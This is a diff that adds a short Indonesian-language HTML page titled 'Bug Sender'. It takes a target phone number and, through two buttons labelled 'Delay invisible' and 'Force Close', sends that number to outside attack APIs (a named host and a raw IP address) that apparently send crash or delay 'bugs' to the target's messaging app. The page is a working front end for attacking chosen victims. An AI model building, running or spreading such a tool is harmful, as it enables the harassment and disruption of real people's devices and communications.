@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <title>Bug Sender</title>
+  <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #1a1a1a;
+      color: white;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 50px;
+    }
+    input, button {
+      margin: 10px;
+      padding: 10px;
+      border-radius: 8px;
+      border: none;
+    }
+    input {
+      width: 300px;
+    }
+    button {
+      background: #007bff;
+      color: white;
+      cursor: pointer;
+    }
+    button:hover {
+      background: #0056b3;
+    }
+  </style>
+</head>
+<body>
+  <h2>BUG TANPA SENDER BY DEFFA</h2>
+  <input type="text" id="targetNumber" placeholder="Masukkan Nomor Target (tanpa +)">
+  <br>
+  <button onclick="sendDelayBug()">Delay invisible</button>
+  <button onclick="sendForceCloseBug()">Force Close</button>
+
+  <script>
+    async function sendDelayBug() {
+      const target = document.getElementById('targetNumber').value;
+      if (!target) return alert("Masukkan nomor target terlebih dahulu!");
+      const apiUrl = `http://danzy.mydigital-store.me/danzy?chatId=${target}&type=delay`;
+      try {
+        const response = await axios.get(apiUrl);
+        alert("Bug Delay Terkirim!");
+        console.log("Response:", response.data);
+      } catch (error) {
+        alert("Gagal mengirim bug delay!");
+        console.error("Error:", error);
+      }
+    }
+
+    async function sendForceCloseBug() {
+      const targetNumber = document.getElementById('targetNumber').value;
+      if (!targetNumber) return alert("Masukkan nomor target terlebih dahulu!");
+      const apiUrl = `http://128.199.128.105:2002/kipopapi?chatId=${targetNumber}&type=crashtotal`;
+      try {
+        const response = await axios.get(apiUrl);
+        alert("Bug Force Close Terkirim!");
+        console.log("Response:", response.data);
+      } catch (error) {
+        alert("Gagal mengirim bug force close!");
+        console.error("Error:", error);
+      }
+    }
+  </script>
+</body>
+</html>
